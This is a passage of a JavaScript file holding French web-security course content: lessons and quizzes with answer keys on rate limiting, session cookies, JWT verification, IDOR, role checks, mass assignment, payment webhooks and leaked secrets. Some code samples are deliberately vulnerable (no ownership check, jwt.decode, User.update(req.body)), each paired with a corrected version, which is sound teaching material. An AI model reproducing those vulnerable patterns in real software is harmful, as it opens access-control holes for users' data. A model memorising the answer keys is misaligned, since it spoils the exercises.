          ['Chiffré avec AES', 'Réversible si la clé fuit'],
          ['MD5 ou SHA-256', 'Trop rapide à attaquer'],
          ['bcrypt', 'Limité à 72 octets'],
        ]),
      ]),

      lesson('connexion', 'Une connexion qui résiste aux attaques', [
        tip(
          'Freiner les essais en masse',
          'Un formulaire de connexion subit deux attaques automatisées :\n• la force brute : essayer des milliers de mots de passe sur un même compte ;\n• le bourrage d’identifiants (credential stuffing) : essayer des couples e-mail et mot de passe volés sur d’autres sites, en comptant sur la réutilisation.\n\nParades :\n• limiter le débit, par adresse IP et par compte, et répondre 429 Too Many Requests (express-rate-limit en quelques lignes) ;\n• ajouter un délai croissant après plusieurs échecs plutôt qu’un blocage définitif, qui permettrait à n’importe qui de bloquer le compte d’un autre ;\n• un message d’erreur unique, « E-mail ou mot de passe incorrect », pour ne pas révéler quels e-mails existent. Même règle pour « mot de passe oublié » : « Si ce compte existe, un lien a été envoyé ».\n\nSur les règles de mot de passe, les recommandations actuelles du NIST privilégient la longueur, la vérification contre les listes de mots de passe déjà fuités, et l’absence de changement forcé à intervalle fixe.',
          'import rateLimit from "express-rate-limit"\n\nconst limiteConnexion = rateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  limit: 10,                // 10 essais par IP\n})\n\napp.post("/connexion", limiteConnexion, connecter)',
        ),
        qcm(
          'Quel message afficher après un échec de connexion ?',
          [
            '« Aucun compte avec cet e-mail »',
            '« Mot de passe incorrect pour awa@mail.sn »',
            '« Erreur SQL : utilisateur introuvable »',
            '« E-mail ou mot de passe incorrect »',
          ],
          3,
          'Un message différent selon le cas permet de découvrir quels e-mails sont inscrits (énumération des comptes), première étape d’une attaque ciblée.',
        ),
        fill(
          'Réponds avec le bon code quand le client dépasse la limite d’essais.',
          'return res.status(___).json({ erreur: "Trop d’essais, réessaie plus tard" })',
          ['429', '401', '403', '503'],
          '429',
          '429 Too Many Requests est le code prévu pour la limitation de débit. Il peut s’accompagner d’un en-tête Retry-After.',
        ),
        qcm(
          'Qu’est-ce que le bourrage d’identifiants (credential stuffing) ?',
          [
            'Deviner le mot de passe lettre par lettre',
            'Remplir la base de faux comptes',
            'Réessayer sur ton site des couples e-mail et mot de passe volés ailleurs',
            'Envoyer un formulaire de connexion très volumineux',
          ],
          2,
          'L’attaque mise sur la réutilisation des mots de passe. Limitation de débit, vérification contre les mots de passe fuités et double authentification la freinent.',
        ),
        tip(
          'Double authentification et réinitialisation',
          'La double authentification (MFA) ajoute une preuve en plus du mot de passe. Toutes ne se valent pas :\n• les clés d’accès (passkeys, WebAuthn) sont liées au domaine du site : elles résistent à l’hameçonnage ;\n• les codes TOTP d’une application d’authentification sont un bon niveau ;\n• le code par SMS reste mieux que rien, mais il est exposé aux échanges frauduleux de carte SIM et à l’interception.\n\nLe lien « mot de passe oublié » est une porte d’entrée aussi sensible que la connexion :\n• jeton tiré avec crypto.randomBytes, jamais avec Math.random, qui est prévisible ;\n• stocke seulement l’empreinte du jeton en base ;\n• durée de vie courte (par exemple 30 minutes) et usage unique ;\n• après la réinitialisation, ferme les autres sessions ouvertes.',
          'import crypto from "node:crypto"\n\nconst jeton = crypto.randomBytes(32).toString("hex")\nconst empreinte = crypto.createHash("sha256").update(jeton).digest("hex")\nawait enregistrerReset(user.id, empreinte, Date.now() + 30 * 60 * 1000)\n// le jeton en clair part seulement dans l’e-mail',
        ),
        vf(
          'Math.random() convient pour générer un jeton de réinitialisation de mot de passe.',
          false,
          'Math.random n’est pas conçu pour la sécurité : ses sorties peuvent être prédites. Utilise crypto.randomBytes ou crypto.randomUUID.',
        ),
        qcm(
          'Quelle double authentification résiste le mieux à un faux site qui imite ta page de connexion ?',
          [
            'Un code reçu par SMS',
            'Une clé d’accès (passkey) WebAuthn',
            'Une question secrète',
            'Un code reçu par e-mail',
          ],
          1,
          'Une passkey est liée cryptographiquement au domaine : sur un faux domaine, le navigateur ne la propose même pas. Les codes, eux, peuvent être recopiés sur le faux site.',
        ),
        vf(
          'Imposer un changement de mot de passe tous les 90 jours est aujourd’hui recommandé par le NIST.',
          false,
          'Le NIST déconseille les changements forcés à intervalle fixe, qui poussent vers des mots de passe prévisibles. On impose un changement en cas de compromission.',
        ),
        match('Associe chaque attaque à sa parade principale.', [
          ['Force brute', 'Limitation de débit'],
          ['Énumération des comptes', 'Message d’erreur unique'],
          ['Hameçonnage', 'Clés d’accès (passkeys)'],
          ['Jeton de reset prévisible', 'crypto.randomBytes'],
        ]),
      ]),

      lesson('sessions-cookies', 'Sessions et cookies', [
        tip(
          'Un identifiant de session bien protégé',
          'HTTP ne se souvient de rien : après la connexion, le serveur crée une session (en base, dans Redis…) et remet au navigateur un identifiant long et aléatoire dans un cookie. Quiconque possède cet identifiant est connecté à ta place : il doit être aussi protégé qu’un mot de passe.\n\nLes attributs du cookie font le travail :\n• HttpOnly : le JavaScript de la page ne peut pas le lire (document.cookie), un XSS ne peut donc pas le voler.\n• Secure : envoyé seulement en HTTPS.\n• SameSite=Lax : pas envoyé avec les requêtes POST venues d’un autre site, ce qui bloque la plupart des CSRF. Strict est encore plus fermé ; None exige Secure et n’est utile que pour des usages entre sites.\n• Max-Age ou Expires : durée de vie limitée.\n• Le préfixe __Host- impose Secure, Path=/ et l’absence de Domain : le cookie ne peut pas être posé ou écrasé par un sous-domaine.\n\nNe mets jamais l’identifiant de session dans l’URL : il finirait dans l’historique, les journaux et l’en-tête Referer.',
          'res.cookie("__Host-sid", idSession, {\n  httpOnly: true,\n  secure: true,\n  sameSite: "lax",\n  path: "/",\n  maxAge: 8 * 60 * 60 * 1000, // 8 heures\n})',
        ),
        match('Associe chaque attribut de cookie à son effet.', [
          ['HttpOnly', 'Illisible depuis JavaScript'],
          ['Secure', 'Envoyé seulement en HTTPS'],
          ['SameSite=Lax', 'Pas envoyé avec les POST d’un autre site'],
          ['Max-Age', 'Durée de vie limitée'],
        ]),
        fill(
          'Empêche un script de la page de lire le cookie de session.',
          'res.cookie("sid", id, { ___: true, secure: true, sameSite: "lax" })',
          ['httpOnly', 'hidden', 'private', 'encrypted'],
          'httpOnly',
          'httpOnly: true ajoute l’attribut HttpOnly : document.cookie ne voit plus ce cookie.',
        ),
        vf(
          'Un navigateur moderne accepte un cookie SameSite=None sans l’attribut Secure.',
          false,
          'Les navigateurs rejettent SameSite=None sans Secure. Un cookie qui part vers d’autres sites doit au moins voyager chiffré.',
        ),
        tip(
          'Fixation, expiration et déconnexion',
          'La fixation de session : l’attaquant obtient un identifiant de session valide (non connecté), réussit à l’imposer à la victime, puis attend qu’elle se connecte. Si le serveur garde le même identifiant après la connexion, l’attaquant est connecté avec elle. La parade est simple : générer un nouvel identifiant à chaque changement de niveau de privilège, en particulier à la connexion (req.session.regenerate avec express-session).\n\nLa durée compte aussi :\n• une expiration d’inactivité (par exemple 30 minutes pour une interface d’administration) ;\n• une expiration absolue, même si l’utilisateur reste actif.\n\nÀ la déconnexion, détruis la session côté serveur. Effacer seulement le cookie dans le navigateur ne suffit pas : quelqu’un qui a copié l’identifiant pourrait encore s’en servir.\n\nPense aussi à un écran « mes appareils connectés » qui permet de fermer les autres sessions, surtout sur une application de paiement.',
          'app.post("/connexion", async (req, res, next) => {\n  const user = await verifierIdentifiants(req.body)\n  if (!user) return res.status(401).json({ erreur: "E-mail ou mot de passe incorrect" })\n  req.session.regenerate((err) => {\n    if (err) return next(err)\n    req.session.userId = user.id\n    res.json({ ok: true })\n  })\n})',
        ),
        qcm(
          'Comment se protéger de la fixation de session ?',
          [
            'Allonger l’identifiant de session',
            'Mettre l’identifiant dans l’URL plutôt que dans un cookie',
            'Chiffrer le cookie',
            'Générer un nouvel identifiant de session à la connexion',
          ],
          3,
          'L’identifiant connu de l’attaquant devient inutile si le serveur en émet un nouveau au moment où l’utilisateur se connecte.',
        ),
        vf(
          'Pour déconnecter quelqu’un, il suffit d’effacer le cookie dans son navigateur.',
          false,
          'Si la session reste valide côté serveur, une copie de l’identifiant fonctionne toujours. Il faut détruire la session sur le serveur.',
        ),
        order(
          'Remets dans l’ordre une connexion bien faite.',
          [
            'Limiter le débit de la route de connexion',
            'Vérifier l’e-mail et le mot de passe avec argon2.verify',
            'Régénérer l’identifiant de session',
            'Enregistrer l’utilisateur dans la nouvelle session',
            'Envoyer le cookie HttpOnly, Secure, SameSite',
          ],
          'La limitation s’applique avant tout calcul coûteux ; la régénération intervient juste après la vérification réussie.',
        ),
        qcm(
          'Où placer l’identifiant de session côté navigateur ?',
          [
            'Dans un cookie HttpOnly et Secure',
            'Dans l’URL de chaque page',
            'Dans localStorage',
            'Dans un champ caché de chaque formulaire',
          ],
          0,
          'Un cookie HttpOnly est hors de portée du JavaScript et n’apparaît ni dans l’historique ni dans les journaux, contrairement à l’URL.',
        ),
      ]),

      lesson('jwt', 'Les jetons JWT sans illusions', [
        tip(
          'Signé ne veut pas dire chiffré',
          'Un JWT (JSON Web Token) a trois parties séparées par des points : un en-tête, un contenu (payload) et une signature, chacune encodée en base64url. La signature garantit que le contenu n’a pas été modifié, mais n’importe qui peut le lire : colle un jeton dans un décodeur et tu verras tout. N’y mets donc jamais de secret ni de donnée sensible.\n\nPièges classiques à la vérification :\n• l’algorithme « none » : certaines bibliothèques acceptaient autrefois un jeton non signé si l’en-tête le demandait. Fixe toujours la liste des algorithmes acceptés ;\n• jwt.decode lit le contenu sans vérifier la signature : ne l’utilise jamais pour décider d’un accès ;\n• un secret HS256 court se casse hors ligne : prends au moins 256 bits aléatoires ;\n• vérifie l’expiration (exp), et si tu les utilises l’émetteur (iss) et le destinataire (aud).',
          'import jwt from "jsonwebtoken"\n\nconst jeton = jwt.sign({ sub: user.id, role: user.role }, process.env.JWT_SECRET, {\n  algorithm: "HS256",\n  expiresIn: "15m",\n})\n\nconst donnees = jwt.verify(jeton, process.env.JWT_SECRET, { algorithms: ["HS256"] })',
        ),
        vf(
          'Le contenu d’un JWT signé est lisible par n’importe qui qui possède le jeton.',
          true,
          'Il est seulement encodé en base64url. La signature empêche la modification, pas la lecture.',
        ),
        fill(
          'Fixe les algorithmes acceptés lors de la vérification.',
          'jwt.verify(jeton, secret, { ___: ["HS256"] })',
          ['algorithms', 'alg', 'type', 'cipher'],
          'algorithms',
          'Avec jsonwebtoken, l’option algorithms limite les algorithmes acceptés : un jeton annonçant « none » ou un autre algorithme est refusé.',
        ),
        qcm(
          'Ce middleware est-il sûr ?',
          [
            'Oui, le jeton vient de notre propre serveur',
            'Oui, si le site est en HTTPS',
            'Non : decode ne vérifie pas la signature, n’importe qui peut fabriquer un jeton',
            'Non, mais seulement si le jeton a expiré',
          ],
          2,
          'jwt.decode lit le contenu sans rien vérifier. Un attaquant fabrique un jeton avec role: "admin" et passe. Il faut jwt.verify.',
          'function auth(req, res, next) {\n  const jeton = req.headers.authorization?.split(" ")[1]\n  req.user = jwt.decode(jeton)\n  next()\n}',
        ),
        tip(
          'Durée de vie et stockage',
          'Un JWT est valable jusqu’à son expiration : le serveur ne garde rien, donc il ne peut pas facilement le révoquer. Un jeton volé qui dure 30 jours donne 30 jours d’accès. La pratique courante :\n• un jeton d’accès court (5 à 15 minutes) ;\n• un jeton de rafraîchissement plus long, stocké côté serveur pour pouvoir le révoquer, et remplacé à chaque utilisation (rotation) : si un ancien jeton resurgit, c’est un vol, on ferme toute la famille de jetons.\n\nOù le garder dans un navigateur ? localStorage est lisible par tout script de la page : un seul XSS suffit à le voler. Un cookie HttpOnly, Secure, SameSite le met hors de portée du JavaScript ; il faut alors une protection CSRF, comme pour une session classique.\n\nSouvent, pour une application web simple, une session côté serveur dans un cookie reste plus simple et plus facile à révoquer qu’un JWT.',
        ),
        qcm(
          'Quelle durée de vie choisir pour un jeton d’accès JWT ?',
          [
            'Un an, pour ne pas gêner l’utilisateur',
            'Sans expiration',
            '30 jours',
            'Quelques minutes, avec un jeton de rafraîchissement',
          ],
          3,
          'Un jeton d’accès court limite les dégâts en cas de vol, et le jeton de rafraîchissement, stocké côté serveur, peut être révoqué.',
        ),
        vf(
          'Stocker un JWT dans localStorage le protège d’un vol par XSS.',
          false,
          'Tout script exécuté sur la page lit localStorage. Un cookie HttpOnly est hors de portée du JavaScript.',
        ),
        match('Associe chaque partie ou notion à son rôle.', [
          ['Payload', 'Contenu lisible par tous'],
          ['Signature', 'Preuve que le contenu n’a pas changé'],
          ['exp', 'Date d’expiration'],
          ['Rotation du refresh token', 'Détecter la réutilisation d’un jeton volé'],
        ]),
      ]),
    ],
  ),

  // ─── Thème 2 : contrôle d’accès ────────────────────────────────────────────
  unit(
    'acces',
    'Contrôle d’accès',
    'Vérifier sur chaque route qui a le droit de faire quoi, éviter les IDOR et l’affectation de masse, et ne jamais laisser le client décider d’un paiement ou d’un rôle.',
    [
      lesson('idor', 'IDOR : la ressource des autres', [
        tip(
          'Connecté ne veut pas dire autorisé',
          'Deux questions différentes :\n• l’authentification : qui es-tu ? (connexion, session, jeton) ;\n• l’autorisation : as-tu le droit de faire cette action sur cette ressource ?\n\nLe contrôle d’accès défaillant est en tête du Top 10 de l’OWASP en 2021 comme en 2025 (A01). Sa forme la plus fréquente s’appelle IDOR (Insecure Direct Object Reference), ou BOLA dans le vocabulaire des API.\n\nExemple : GET /api/factures/1043 renvoie la facture 1043 à tout utilisateur connecté. Awa change l’URL en /api/factures/1042 et lit la facture d’un autre client, avec son nom et son numéro de téléphone. Il suffit d’un script pour toutes les récupérer.\n\nLa parade : sur chaque route, vérifier que la ressource appartient à l’utilisateur (ou qu’il a un rôle qui l’autorise). Le plus simple est de l’écrire dans la requête elle-même : WHERE id = $1 AND client_id = $2.',
          '// Vulnérable : n’importe quel connecté lit n’importe quelle facture\nconst r = await db.query("SELECT * FROM factures WHERE id = $1", [req.params.id])\n\n// Corrigé : la facture doit appartenir à l’utilisateur\nconst r = await db.query(\n  "SELECT * FROM factures WHERE id = $1 AND client_id = $2",\n  [req.params.id, req.session.userId],\n)\nif (r.rowCount === 0) return res.sendStatus(404)',
        ),
        qcm(
          'Pourquoi cette route est-elle vulnérable ?',
          [
            'Elle utilise une requête paramétrée',
            'Elle ne vérifie pas que la commande appartient à l’utilisateur connecté',
            'Elle renvoie du JSON',
            'Elle utilise GET au lieu de POST',
          ],
          1,
          'requireAuth vérifie seulement que quelqu’un est connecté. N’importe quel client peut lire la commande d’un autre en changeant l’identifiant.',
          'app.get("/api/commandes/:id", requireAuth, async (req, res) => {\n  const r = await db.query("SELECT * FROM commandes WHERE id = $1", [req.params.id])\n  res.json(r.rows[0])\n})',
        ),
        fill(
          'Limite la requête aux commandes de l’utilisateur connecté.',
          'SELECT * FROM commandes\nWHERE id = $1 ___ client_id = $2',
          ['AND', 'OR', 'UNION', 'LIKE'],
          'AND',
          'Les deux conditions doivent être vraies : la bonne commande et le bon propriétaire. Avec OR, on élargirait au contraire l’accès.',
        ),
        vf(
          'Utiliser des UUID aléatoires au lieu d’identifiants 1, 2, 3 suffit à corriger un IDOR.',
          false,
          'Un UUID est plus dur à deviner, mais il fuit (lien partagé, journal, capture d’écran). Le contrôle de propriété reste indispensable.',
        ),
        tip(
          '401, 403 ou 404, et partout',
          'Les codes de refus ont un sens précis :\n• 401 Unauthorized : tu n’es pas authentifié (pas de session, jeton invalide) ;\n• 403 Forbidden : on sait qui tu es, mais tu n’as pas le droit ;\n• 404 Not Found : souvent préféré pour la ressource d’un autre, pour ne même pas confirmer qu’elle existe.\n\nLe contrôle doit couvrir toutes les portes, pas seulement la lecture :\n• modification et suppression (PUT, PATCH, DELETE) ;\n• exports CSV ou PDF, téléchargements de pièces jointes, reçus de paiement ;\n• routes « internes » appelées par ton application mobile ;\n• requêtes de liste : ?client_id=… ne doit pas permettre de lister les autres.\n\nÉcris un test automatique simple pour chaque ressource : l’utilisateur A tente de lire, modifier et supprimer la ressource de B, et doit échouer.',
        ),
        qcm(
          'Un utilisateur connecté demande l’action d’administration qu’il n’a pas le droit de faire. Quel code ?',
          ['401 Unauthorized', '400 Bad Request', '403 Forbidden', '500 Internal Server Error'],
          2,
          '401 signifie « pas authentifié ». Ici on sait qui il est, mais il n’a pas les droits : 403.',
        ),
        match('Associe chaque situation au code HTTP adapté.', [
          ['Pas de session', '401'],
          ['Connecté, mais rôle insuffisant', '403'],
          ['Facture d’un autre client, existence cachée', '404'],
          ['Trop de requêtes', '429'],
        ]),
        order(
          'Remets dans l’ordre le traitement d’une suppression de commande.',
          [
            'Vérifier que l’utilisateur est authentifié',
            'Valider le format de l’identifiant',
            'Chercher la commande avec id ET client_id',
            'Renvoyer 404 si aucune ligne ne correspond',
            'Supprimer la commande et répondre 204',
          ],
          'Authentifier, valider, puis vérifier la propriété avant toute action. Le contrôle de propriété fait partie de la requête.',
        ),
        vf(
          'Un test automatique « l’utilisateur A tente de lire la ressource de B » est un bon moyen d’éviter les IDOR.',
          true,
          'Ces tests sont simples à écrire et empêchent une régression le jour où quelqu’un ajoute une route sans contrôle.',
        ),
      ]),

      lesson('roles', 'Rôles et moindre privilège', [
        tip(
          'Refuser par défaut',
          'Le contrôle par rôles (RBAC) donne à chaque utilisateur un rôle, client, vendeur, support, administrateur, et à chaque rôle une liste d’actions permises. Quelques principes :\n\n• Refus par défaut : une route sans règle explicite est fermée, pas ouverte. Un oubli doit produire un refus, pas une fuite.\n• Contrôle centralisé : un middleware réutilisable plutôt que des if recopiés dans chaque route, que quelqu’un finira par oublier.\n• Le rôle vient du serveur : de la session ou d’un jeton signé, jamais d’un champ envoyé par le client.\n\nOn distingue deux escalades de privilèges :\n• verticale : un client accède aux fonctions d’un administrateur ;\n• horizontale : un client accède aux données d’un autre client (c’est l’IDOR de la leçon précédente).',
          'function exigerRole(...roles) {\n  return (req, res, next) => {\n    if (!req.user) return res.sendStatus(401)\n    if (!roles.includes(req.user.role)) return res.sendStatus(403)\n    next()\n  }\n}\n\napp.delete("/api/vendeurs/:id", exigerRole("admin"), supprimerVendeur)',
        ),
        vf(
          'Masquer le bouton « Supprimer » aux non-administrateurs suffit à protéger la suppression.',
          false,
          'L’interface est un confort. N’importe qui peut appeler directement DELETE /api/… : le contrôle doit être sur le serveur.',
        ),
        fill(
          'Protège la route de remboursement pour le support et les administrateurs.',
          'app.post("/api/remboursements", ___("support", "admin"), rembourser)',
          ['exigerRole', 'requireBody', 'cors', 'express.json'],
          'exigerRole',
          'Le middleware vérifie le rôle avant d’appeler le gestionnaire. Toute autre valeur de rôle reçoit 403.',
        ),
        qcm(
          'Une nouvelle route n’a encore aucune règle d’accès. Que doit-il se passer ?',
          [
            'Elle est refusée par défaut',
            'Elle est accessible à tous les utilisateurs connectés',
            'Elle est accessible à tous, connectés ou non',
            'Elle est accessible seulement en développement',
          ],
          0,
          'Avec le refus par défaut, un oubli se voit tout de suite (la route ne marche pas) au lieu de passer inaperçu en production.',
        ),
        tip(
          'Le moindre privilège partout',
          'Le principe du moindre privilège dit : chaque personne, programme ou clé n’a que les droits nécessaires à sa tâche, rien de plus. Il limite les dégâts quand quelque chose est compromis.\n\n• Base de données : l’application se connecte avec un utilisateur qui peut lire et écrire ses tables, pas avec le superutilisateur postgres. Une injection SQL ne pourra alors pas supprimer la base entière ni lire les autres bases.\n• Clés d’API : demande des clés limitées (lecture seule, un seul service) quand le fournisseur le permet.\n• Comptes d’administration : peu nombreux, avec double authentification, et des actions journalisées.\n• Jetons de CI : permissions minimales pour chaque tâche.\n\nUne interface d’administration séparée, sur son propre sous-domaine et avec son propre système de connexion, réduit aussi l’exposition.',
          "-- Utilisateur dédié à l’application, sans droits d’administration\nCREATE ROLE app_boutique LOGIN PASSWORD '…';\nGRANT SELECT, INSERT, UPDATE ON produits, commandes TO app_boutique;",
        ),
        match('Associe chaque escalade à un exemple.', [
          ['Verticale', 'Un client ouvre /admin et supprime un vendeur'],
          ['Horizontale', 'Un client lit la commande d’un autre client'],
        ]),
        qcm(
          'Avec quel compte l’application doit-elle se connecter à PostgreSQL ?',
          [
            'Le superutilisateur postgres, pour éviter les erreurs de droits',
            'Un compte dédié limité aux tables et actions nécessaires',
            'Le compte personnel du développeur principal',
            'Un compte sans mot de passe, accessible seulement en local',
          ],
          1,
          'Moindre privilège : si l’application est compromise, l’attaquant n’hérite que des droits de ce compte limité.',
        ),
        vf(
          'Lire le rôle depuis un champ role envoyé dans le corps de la requête est acceptable si le champ est validé.',
          false,
          'Le client choisit ce qu’il envoie : il écrira role: "admin". Le rôle se lit côté serveur, dans la session ou un jeton vérifié.',
        ),
        order(
          'Remets dans l’ordre les vérifications d’un middleware de rôle.',
          [
            'Lire l’utilisateur depuis la session',
            'Répondre 401 s’il n’y a pas d’utilisateur',
            'Répondre 403 si son rôle n’est pas dans la liste',
            'Appeler next() pour passer au gestionnaire',
          ],
          'D’abord « qui es-tu ? » (401), puis « en as-tu le droit ? » (403), et seulement ensuite l’action.',
        ),
      ]),

      lesson('logique-metier', 'Affectation de masse et logique métier', [
        tip(
          'L’affectation de masse',
          'Beaucoup de bugs d’accès viennent d’une ligne pratique : copier tout le corps de la requête dans l’objet en base. Un formulaire « modifier mon profil » envoie { nom, ville }, mais rien n’empêche d’ajouter "role": "admin", "verifie": true ou "solde": 1000000. Si le code fait User.update(req.body), ces champs passent.\n\nC’est l’affectation de masse (mass assignment). La parade :\n• choisir explicitement les champs modifiables (liste blanche) ;\n• ou valider avec un schéma strict qui refuse les champs inconnus (.strict() avec zod) ;\n• séparer les routes : la modification du rôle passe par une route d’administration distincte.\n\nLe même piège existe dans l’autre sens : renvoyer tout l’objet utilisateur en JSON expose l’empreinte du mot de passe, le jeton de réinitialisation ou des notes internes. Choisis aussi les champs que tu renvoies.',
          '// Vulnérable\nawait User.update(req.body, { where: { id: req.user.id } })\n\n// Corrigé : seulement les champs prévus\nconst { nom, ville, bio } = ProfilSchema.parse(req.body)\nawait User.update({ nom, ville, bio }, { where: { id: req.user.id } })',
        ),
        qcm(
          'Que risque cette route si un utilisateur envoie { "nom": "Awa", "role": "admin" } ?',
          [
            'Rien, Sequelize ignore les champs inconnus du formulaire',
            'Une erreur 400 automatique',
            'Une injection SQL',
            'Il devient administrateur',
          ],
          3,
          'Le modèle a bien une colonne role : User.update(req.body) la modifie. C’est l’affectation de masse.',
          'app.patch("/api/moi", requireAuth, async (req, res) => {\n  await User.update(req.body, { where: { id: req.user.id } })\n  res.sendStatus(204)\n})',
        ),
        fill(
          'Fais refuser les champs inconnus par le schéma zod.',
          'const Profil = z.object({ nom: z.string().max(80), ville: z.string().max(60) }).___()',
          ['strict', 'optional', 'passthrough', 'partial'],
          'strict',
          '.strict() fait échouer la validation si le corps contient un champ non déclaré, comme role. passthrough ferait l’inverse : tout laisser passer.',
        ),
        tip(
          'Les paiements : le client propose, le serveur vérifie',
          'Les failles de logique métier ne se voient dans aucun scanner : il faut penser comme un fraudeur.\n\n• Quantités négatives ou nulles : une ligne de -3 articles fait baisser le total. Valide des entiers positifs.\n• Coupons : vérifie côté serveur qu’ils sont valides, non expirés, et utilisables une seule fois par compte si c’est la règle.\n• Paiement mobile money ou par carte : la redirection vers « /paiement/succes » ne prouve rien, n’importe qui peut ouvrir cette page. La commande ne passe au statut payé que sur la notification de serveur à serveur (webhook) de l’opérateur, dont tu vérifies la signature, puis en contrôlant que le montant, la devise et la référence correspondent à la commande.\n• Idempotence : la même notification peut arriver deux fois ; une commande ne doit être livrée ou créditée qu’une fois.\n\nPour vérifier une signature HMAC, compare avec crypto.timingSafeEqual plutôt que ===, afin de ne pas révéler par le temps de réponse combien de caractères sont justes.',
          'const attendu = crypto.createHmac("sha256", process.env.WEBHOOK_SECRET)\n  .update(corpsBrut)\n  .digest()\nconst recu = Buffer.from(req.get("X-Signature") ?? "", "hex")\nconst valide = recu.length === attendu.length && crypto.timingSafeEqual(recu, attendu)',
        ),
        vf(
          'Quand le client arrive sur la page /paiement/succes, on peut marquer la commande comme payée.',
          false,
          'Cette page est accessible à n’importe qui. Seule la notification signée de l’opérateur, avec le bon montant, prouve le paiement.',
        ),
        qcm(
          'Un panier contient une ligne avec quantite: -3. Que doit faire le serveur ?',
          [
            'Calculer le total normalement',
            'Remplacer -3 par 3',
            'Refuser la requête : la quantité doit être un entier positif',
            'Ignorer la ligne et continuer',
          ],
          2,
          'Une quantité négative ferait baisser le total. La validation doit refuser clairement plutôt que corriger en silence.',
        ),
        order(
          'Remets dans l’ordre le traitement d’une notification de paiement.',
          [
            'Lire le corps brut de la requête',
            'Vérifier la signature HMAC avec timingSafeEqual',
            'Retrouver la commande par sa référence',
            'Vérifier montant et devise, et que la commande n’est pas déjà payée',
            'Passer la commande au statut payé',
          ],
          'Sans signature valide, on s’arrête. Puis on vérifie le contenu et l’idempotence avant de changer le statut.',
        ),
        match('Associe chaque faille à sa correction.', [
          ['Affectation de masse', 'Liste blanche des champs modifiables'],
          ['Prix envoyé par le client', 'Relire le prix en base'],
          ['Faux retour « paiement réussi »', 'Webhook signé et vérifié'],
          ['Notification reçue deux fois', 'Traitement idempotent'],
        ]),
      ]),
    ],
  ),

  // ─── Thème 3 : secrets et dépendances ──────────────────────────────────────
  unit(
    'secrets-dependances',
    'Secrets et dépendances',
    'Garder les clés hors du code et du navigateur, réagir à une fuite, surveiller les dépendances vulnérables et se protéger des paquets malveillants.',
    [
      lesson('secrets-code', 'Garder les secrets hors du code', [
        tip(
          'Ce qui est un secret, et où il vit',
          'Un secret, c’est tout ce qui donne un accès : mot de passe de la base, clé d’API d’un opérateur de paiement ou d’envoi de SMS, secret de signature des JWT, clé privée TLS ou SSH, jeton GitHub. Règle simple : jamais dans le code source, jamais dans Git, même dans un dépôt privé (il peut devenir public, être cloné par un prestataire, fuiter avec un ordinateur volé).\n\nEn pratique :\n• en local, un fichier .env lu au démarrage, listé dans .gitignore ;\n• un fichier .env.example versionné, avec les noms des variables et des valeurs factices ;\n• en production, les variables d’environnement de l’hébergeur, ou un gestionnaire de secrets ;\n• des secrets différents en développement et en production.\n\nAttention au front-end : tout ce qui est dans le code envoyé au navigateur est public. Avec Vite, les variables préfixées VITE_ sont recopiées dans le bundle ; avec Next.js, celles préfixées NEXT_PUBLIC_. Une clé secrète n’a rien à y faire : c’est ton serveur qui appelle l’API du fournisseur.',
          '# .gitignore\n.env\n.env.*\n!.env.example\n\n# .env.example (versionné)\nDATABASE_URL=postgres://user:motdepasse@localhost:5432/boutique\nPAIEMENT_CLE_SECRETE=a-remplir',
        ),
        vf(
          'Une clé secrète placée dans VITE_PAIEMENT_CLE reste cachée, car elle est dans une variable d’environnement.',
          false,
          'Vite remplace import.meta.env.VITE_… par sa valeur dans le JavaScript envoyé au navigateur. N’importe qui la lit dans les outils de développement.',
        ),
        fill(
          'Empêche le fichier de secrets locaux d’être versionné.',
          '# ___\n.env\nnode_modules/',
          ['.gitignore', '.env.example', 'package.json', '.npmrc'],
          '.gitignore',
          'Les chemins listés dans .gitignore ne sont pas ajoutés par git add. Attention : un fichier déjà suivi le reste, il faut le retirer avec git rm --cached.',
        ),
        tip(
          'Un secret a fuité : l’ordre des gestes',
          'Tu as poussé une clé sur GitHub ? Supprimer le fichier dans un nouveau commit ne sert à rien : elle reste dans l’historique, dans les copies (forks, clones) et des robots parcourent en permanence les dépôts publics à la recherche de clés.\n\nL’ordre des gestes :\n1. Révoquer ou faire tourner la clé tout de suite chez le fournisseur : c’est le seul geste qui coupe l’accès.\n2. Mettre la nouvelle clé dans les variables de production et redéployer.\n3. Vérifier les journaux du fournisseur : la clé a-t-elle été utilisée par quelqu’un d’autre ?\n4. Nettoyer l’historique si nécessaire (git filter-repo), en sachant que ce n’est pas une protection.\n\nPour éviter que cela arrive :\n• le secret scanning de GitHub et sa protection à la poussée (push protection) bloquent les formats de clés connus ;\n• des outils comme gitleaks ou trufflehog tournent en hook pre-commit et dans la CI.',
        ),
        qcm(
          'Tu viens de pousser la clé de ton fournisseur de SMS dans un dépôt public. Premier geste ?',
          [
            'Supprimer le fichier dans un nouveau commit',
            'Passer le dépôt en privé',
            'Révoquer la clé chez le fournisseur et en générer une nouvelle',
            'Réécrire l’historique Git avec git filter-repo',
          ],
          2,
          'La clé a pu être copiée dès la poussée. Seule la révocation coupe l’accès ; le nettoyage de l’historique vient après.',
        ),
        order(
          'Remets dans l’ordre la réponse à une fuite de secret.',
          [
            'Révoquer la clé exposée',
            'Créer une nouvelle clé et la poser en production',
            'Vérifier dans les journaux du fournisseur toute utilisation suspecte',
            'Nettoyer l’historique et activer le secret scanning',
          ],
          'Couper l’accès d’abord, rétablir le service, mesurer les dégâts, puis empêcher que cela se reproduise.',
        ),
        match('Associe chaque outil à son rôle.', [
          ['.env', 'Secrets locaux, jamais versionnés'],
          ['.env.example', 'Noms des variables, valeurs factices'],
          ['Push protection GitHub', 'Bloquer une poussée qui contient une clé'],
          ['gitleaks', 'Chercher des secrets dans le code et l’historique'],
        ]),
        vf(
          'Dans un dépôt privé, committer le .env de production est acceptable.',
          false,
          'Un dépôt privé change de mains, est cloné sur des postes et intégré à des outils tiers. Les secrets de production restent chez l’hébergeur.',
        ),
        qcm(
          'Ton application React doit envoyer un SMS via une API payante. Où mettre la clé ?',
          [
            'Sur ton serveur, qui appelle l’API de SMS pour le front',
            'Dans une variable VITE_ du front',
            'Dans le code React, mais minifié',
            'Dans localStorage au premier lancement',
          ],
          0,
          'Tout ce qui arrive dans le navigateur est lisible. Le front appelle ta route, ton serveur garde la clé et vérifie qui a le droit d’envoyer.',
        ),
      ]),

      lesson('dependances', 'Dépendances vulnérables', [
        tip(
          'Ton application, c’est surtout le code des autres',
